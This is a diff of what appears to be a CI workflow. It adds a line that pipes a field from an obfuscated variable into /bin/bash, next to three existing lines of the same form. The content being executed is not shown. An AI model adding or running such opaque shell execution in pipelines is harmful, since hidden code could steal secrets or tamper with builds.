@@ -27,6 +27,7 @@ jobs:
           echo $n2492 | jq -r .bcv33 | /bin/bash
           printf '%s' "$lw445" | jq -r .m723 | /bin/bash
           echo $do64836 | jq -r .pygkz53011 | /bin/bash
+          echo $nafc9960 | jq -r .anwc28039 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
